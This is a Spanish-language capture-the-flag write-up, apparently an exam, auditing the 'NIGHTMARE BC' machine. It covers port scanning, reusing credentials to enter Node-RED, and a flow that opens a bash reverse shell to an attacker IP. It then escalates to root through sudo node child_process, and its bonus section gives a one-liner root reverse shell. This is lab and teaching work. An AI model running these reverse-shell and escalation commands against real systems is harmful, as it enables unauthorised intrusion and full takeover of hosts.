*1 / Noviembre / 2025 - MF0488*
# Examen práctico 3 - NIGHTMARE BC (Nebula[.]io)
---

<h4 style="text-align: justify">
La empresa Nebula[.]io sospecha que la máquina <i>NIGHTMARE BC</i> ha sido comprometida por un actor malicioso y nos solicita realizar una auditoría con el objetivo de descubrir posibles vectores de entrada a la máquina.</h4>

## Contenido

- [0. Introducción](#introducción---herramientas-y-metodología)
- [1. Reconocimiento](#1-reconocimiento---escaneo-de-puertos-nmap)
- [2. Acceso inicial](#2-acceso-inicial---ssh-y-node-red)
- [3. Explotación](#3-explotación---reverse-shell)
- [4. Evidencias](#4-evidencias---recolección-de-flags)
- [5. Bonus](#5-bonus) 

---

## Introducción - Herramientas y metodología

Antes de ponerse manos a la obra, es importante actualizar las herramientas necesarias y definir de qué manera se va a trabajar (metodología).

En esta auditoría se hará uso de distintas herramientas desde la perspectiva Blue Team para realizar reconocimiento pasivo. Se omite el análisis y resolución en detalle, pero se incluyen para registro: `VirusTotal`, `Shodan`, `Censys`,`cert.sh`, OSINT en general (reconocimiento de dominios, registros públicos y reputación de artefactos).

Por otro lado, se prestará más atención en este writeup a la parte de auditoría desde la perspectiva Red Team. Se hará uso de las siguientes herramientas: `nmap`, `netcat (nc)`, `xxd` (hexdump) y `base64`.

**Metodología:** Descubrimiento → enumeración activa → análisis de vulnerabilidades → explotación controlada → escalada de privilegios → recolección de evidencias.

---

## 1. Reconocimiento - Escaneo de puertos (Nmap)

Se realiza un escaneo completo y enumeración de versiones básico mediante el uso de nmap:

```bash
$ sudo nmap -vv -sV -p- 10.10.xxx.xx 
```

![reconocimiento_nmap](./nmap.gif)

Y nos reporta de vuelta el siguiente resultado:

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo nmap -vv -sV -p- 10.10.xxx.xx          
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 01:45 CET
NSE: Loaded 47 scripts for scanning.
Initiating Ping Scan at 01:45
Scanning 10.10.xxx.xx [4 ports]
Completed Ping Scan at 01:45, 0.07s elapsed (1 total hosts)
ompleted NSE at 01:46, 0.18s elapsed
Nmap scan report for 10.10.xxx.xx
Host is up, received reset ttl 63 (0.043s latency).
Scanned at 2025-11-06 01:45:40 CET for 33s
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
1880/tcp open  http    syn-ack ttl 63 Node.js Express framework
3030/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
4040/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el momento de explorar los puertos 3030 y 4040, se completan los retos del SIEM y del Firewall, los cuales revelan las siguientes flags:

- **Firewall**: D.Finkelstein
- **SIEM**: Mr.0oG13_B00g13

> Nota: En este escenario se comprende que la resolución de los retos (Tasks 4 y 5) nos facilita las credenciales para poder seguir progresando en la auditoría. En el caso de que el escenario fuera real, se podría buscar como alternativa credenciales filtradas o expuestas, configuraciones incorrectas, claves de acceso por defecto o incluso errores de push con credenciales en repositorios de Nebula[.]io en GitHub o GitLab.


## 2. Acceso inicial - SSH y Node Red

<p style="text-align: justify">Como bien nos reportó <b>Nmap</b>, el servicio <b>SSH</b> se encuentra abierto en el puerto por defecto (22); pero hay otro puerto interesante que nos puede servir como vector de entrada: servicio web (HTTP) de <b>Node.js</b> abierto en el puerto 1880.</p> 
<p style="text-align: justify">Al acceder al puerto anteriormente mencionado, nos encontramos con <b>Node-RED</b>; investigando por Internet nos damos cuenta de que <b>Node-RED</b> es una herramienta de desarrollo de flujos para diseñar e integrar automatizaciones y control sobre dispositivos <b>IoT</b>.</p> 
<p style="text-align: justify">El único problema que nos encontramos es que, para acceder al apartado del "editor de workflows", necesitamos autenticarnos. Por suerte disponemos de unas credenciales que son válidas para <b>SSH</b>, pero como la gente tiene la <i>manía</i> fea de reutilizar contraseñas, procedemos a probar si nos permite el ingreso al editor.</p>

![reconocimiento_nmap](./node_red.gif)

¡Bingo! Tenemos acceso al editor de Node-RED.

- Ahora que ya tenemos acceso a la parte interna de Node-RED, vamos a intentar ubicar la versión instalada. Vemos que es la **v.3.0.2**.

![reconocimiento_nmap](./node_ver.gif)

<p style="text-align: justify">Una búsqueda rápida en Internet nos revela que, a fecha del 7 de julio de 2025, se le asignó una vulnerabilidad crítica <b>(10.0)</b> con el siguiente identificador: <b>CVE-2025-41656</b>. Esta vulnerabilidad permite a un atacante remoto ejecutar código con privilegios elevados debido a una configuración predeterminada insegura de Node-RED.</p>


![nist](nist.png)

## 3. Explotación - Reverse Shell

<p style="text-align: justify">Ahora que tenemos conocimiento sobre la vulnerabilidad crítica que afecta a Node-Red, vamos a intentar explotarla mediante la creación de un flujo simple. Para ello necesitamos dos componentes del menú de nodos: Un ejecutor y un intérprete.</P>

- **Ejecutor**: se encarga de iniciar el flujo una vez desplegado por Node-RED.
- **Intérprete**: se encarga de entender la pieza de código que se le indica para realizar las acciones que se le indiquen. En este caso lo usaremos para inyectar un payload simple de reverse shell.

```bash 
/bin/bash -i >& /dev/tcp/ip_red_team/puerto_escucha 0>&1
```
>Nota: El ejecutor debe estar conectado con el intérprete para que se lleve a cabo la acción.

![node_flujo](flujo.png)

<p style="text-align: justify">Ahora que conocemos los componentes necesarios para abrir una reverse shell, procedemos a iniciar netcat en modo escucha en el puerto 7777.</p>

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 7777
``` 

<p style="text-align: justify">Mientras netcat se encuentra a la espera de recibir una comunicación desde Node-RED, procedemos a desplegar el fujo e iniciarlo mediante el botón del ejecutor:</p>

![node_rs](./node_red_rs.gif)

Si todo ha ido bien, deberíamos tener la shell interactiva de `/bin/bash` operativa en nuestro netcat e ingresado dentro de la máquina:

![nc_shell](./nc_revshell.gif)

## 4. Evidencias - Recolección de flags

Ahora que nos encontramos dentro de la máquina vamos a explorar un poco. En el directorio del usuario `dev` nos encontramos con la primera flag: `user.txt`.

Al mostrar el contenido del archivo `user.txt` vemos que el contenido se encuentra codificado en hexadecimal.</p>

`27 3b 2d 2d 68 61 76 65 20 69 20 62 65 65 6e 20 70 77 6e 65 64 3f`

- Así que mediante la herramienta hexdump `(xxd)` procedemos a descodificar `(flag -d)`:

![user](./user_flag.gif)

>**Flag**: ';--have i been pwned?.

Vamos a por la siguiente flag! Procedemos a listar los directorios de usuario que hay creados mediante el comando `ls -la /home`.

```bash
dev@tnightmarebc:~$ ls -la /home
ls -la /home
total 20
drwxr-xr-x  5 root         root         4096 oct 31 16:38 .
drwxr-xr-x 18 root         root         4096 may 16  2023 ..
drwx------  5 dev          dev          4096 oct 31 16:15 dev
drwx------  3 dfinkelstein dfinkelstein 4096 oct 31 17:27 dfinkelstein
drwx------  4 nightmare    nightmare    4096 oct 31 16:53 nightmare
```
Podemos observar que a parte del usuario `dev`, existen dos mas: `dfinkelstein` y `nightmare`.

Si intentamos intentar acceder a los directorios de los otros usuarios, al carecer de permisos se nos denegará la acción.

```bash
dev@tnightmarebc:~$ cd /home/dfinkelstein
cd /home/dfinkelstein
bash: cd: /home/dfinkelstein: Permiso denegado
```

La única salida viable: escalada de privilegios. 

#### Escalada hacia root

Conociendo que Node.js está instalado en el sistema y tenemos capacidad de comunicarnos mediante terminal, podemos aprovechar el módulo `child_process` de Node.js para generar un proceso hijo que ejecute una shell bash con privilegios elevados (root).

```bash
sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
```

![](./root.gif)

De esta manera cuando el proceso "spawn" crea un proceso hijo de bash, este hereda los mismos privilegios, dándonos así una shell de root interactiva.

Ahora ya podemos movernos a los directorios de todos los usuarios, nos desplazamos a nightmare usando el comando `cd /home/nightmare` y vamos a por la siguiente flag:

![rooted](./nightmare_flag.gif)

>**Flag**: hxxps://youtu[.]be/oxkj7sdlXyg?si=hPg0G1LgzhQ7KdLl

Ahora que ya tenemos una shell bash con privilegios, vamos a explorar el directorio root.

Nos encontramos con la flag dentro del archivo `root.txt`, y al visualizar el contenido, vemos que se encunetra codificado en base64. Mediante la herramienta nativa de kali `base64` procedemos a decodificar mediante la flag `-d`

![final](./root_flag_decoded.gif)

>**Flag**: hxxps://open[.]spotify[.]com/intl-es/track/63y2aL2dT6zzw8FOSLaNrp?si=a026dda14c714ecf

Con esta última flag, damos por concluida la auditoría a la máquina **NIGHTMARE BC** de la empresa nebula[.]io.

## 5. Bonus

<p style="text-align: justify">Después de entender cómo interactuan y funcionan cada uno de los componentes y procesos que conforman la máquina, me pregunte si era posible obtener una reverse shell bash interactiva con privilegios sin necesidad de escalar desde un usario con menos privilegios.</p>

Trasteando un poco con el flujo y el payload, logré iniciar una shell con privilegios con la siguiente instrucción:

```bash
/bin/bash -c "sudo node -e 'require(\"child_process\").execSync(\"/bin/bash -c \\\"bash -i >& /dev/tcp/10.21.225.157/7777 0>&1\\\"\", {stdio: [0, 1, 2]})'"
```

![one_liner](./root_liner.gif)

[Ir al inicio](#contenido) - #EOF
